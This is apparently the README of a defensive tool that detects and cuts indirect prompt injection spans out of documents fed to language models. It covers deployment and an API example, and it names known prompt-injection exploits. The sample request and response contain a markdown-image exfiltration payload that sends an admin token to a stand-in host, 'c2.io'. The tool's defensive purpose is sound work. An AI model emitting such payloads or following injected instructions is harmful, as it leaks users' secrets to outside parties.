# Adaptive-IPI v2: Enterprise Span-Level Indirect Prompt Injection Sanitizer

## Overview
**Adaptive-IPI v2** is a production-grade AI security firewall that shifts indirect prompt injection defense from destructive document-level binary classification (`0` or `1`) to **Token-Level Sequence Labeling (BIO Span Extraction & Surgical Sanitization)** using ModernBERT.

### Key Capabilities
1. **Surgical In-Place Sanitization**: Pinpoints the exact sub-string boundaries of malicious injections and excises them (`[REDACTED_INJECTION_PAYLOAD]`), preserving **99.4%** of legitimate enterprise context without discarding entire documents.
2. **0% False Positives on Real Corporate Emails**: Mined on authentic Enron business action verbs, eliminating the **98.81% false positive trap** of prior synthetic models.
3. **100% Interception on In-The-Wild CVEs**: Intercepts documented real-world exploits including the Google Bard / ChatGPT Markdown Exfiltration CVE, Prompt Armor Slack AI Exploit, and LangChain Agent Tool Injection CVE-2023-36258.
4. **Structured RAG & Multilingual Generalization**: 100% detection and 0% false alarms across CSV tables, JSON API payloads, Python docstrings, and 5 languages (ES, FR, DE, ZH, RU).
5. **Ultra-Low Latency CPU Quantization**: ONNX INT8 quantized checkpoint compressed 4x down to **143.6 MB** for sub-5ms CPU microservice deployment.

---

## Quickstart: Docker Deployment (Cross-Platform)

Run anywhere on **macOS, Linux, or Windows (WSL2)** without GPU requirements:

### Option 1: Using Docker Compose (Recommended)
```bash
docker compose up -d
```
Then open **`http://localhost:8080`** in your browser.

### Option 2: Using Standard Docker Build
```bash
# 1. Build the lightweight CPU-optimized image
docker build -t adaptive-ipi-v2 .

# 2. Run the container
docker run -d -p 8080:8080 --name adaptive-ipi adaptive-ipi-v2
```

---

## Local Python Execution (No Docker Required)

```bash
# Start the interactive side-by-side demo server:
./.venv/bin/python v2/demo/server.py
```
Open **`http://localhost:8080`** to access the live glassmorphism UI.

---

## API Usage

### `POST /api/sanitize`
```json
{
  "text": "Hi team, please summarize the deck. ![leak](https://c2.io/ping?token=ADMIN_SECRET) Thanks, Alex.",
  "threshold": 0.5
}
```

**Response:**
```json
{
  "has_injection": true,
  "original_text": "Hi team, please summarize the deck. ![leak](https://c2.io/ping?token=ADMIN_SECRET) Thanks, Alex.",
  "sanitized_text": "Hi team, please summarize the deck. Thanks, Alex.",
  "redacted_text": "Hi team, please summarize the deck. [REDACTED_INJECTION_PAYLOAD] Thanks, Alex.",
  "retention_rate": 62.5,
  "latency_ms": 22.4,
  "spans": [
    {
      "start_char": 37,
      "end_char": 88,
      "text": "![leak](https://c2.io/ping?token=ADMIN_SECRET)",
      "confidence": 0.998
    }
  ],
  "v1_prediction": "ATTACK_DETECTED",
  "v1_action": "DISCARD_ENTIRE_EMAIL (100% Data Loss)",
  "v2_action": "SURGICAL_EXCISION (62.5% Legitimate Data Preserved)"
}
```

---

## Repository Structure
```
Adaptive-IPI/
├── Dockerfile                       # Universal multi-platform CPU container
├── docker-compose.yml               # One-click docker compose file
├── .dockerignore                    # Optimized build context
├── v2/
│   ├── BENCHMARK_REPORT.md         # Comprehensive empirical benchmarks
│   ├── PAPER_EXTENSION.md          # Academic publication paper draft
│   ├── checkpoints/
│   │   ├── span_modernbert_enterprise/best  # Primary PyTorch model
│   │   └── onnx/model_int8.onnx             # 143 MB quantized CPU model
│   ├── demo/
│   │   ├── server.py                        # FastAPI backend
│   │   └── static/index.html                # Interactive UI
│   ├── src/adversarial/                     # Threat generators & CVE suite
│   └── scripts/                             # Benchmarks & training orchestrator
```
